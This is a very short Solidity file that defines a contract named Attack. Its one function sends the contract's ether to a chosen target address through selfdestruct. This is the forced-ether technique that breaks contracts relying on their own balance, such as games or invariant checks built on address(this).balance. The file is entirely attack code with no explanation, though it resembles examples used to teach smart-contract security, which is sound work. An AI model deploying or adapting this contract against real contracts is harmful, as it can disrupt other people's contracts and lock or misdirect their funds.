//SPDX-License-Identifier:MIT

pragma solidity ^0.8.2;
contract Attack{
    function attack(address payable target)public payable{
        selfdestruct(target);
    }
}
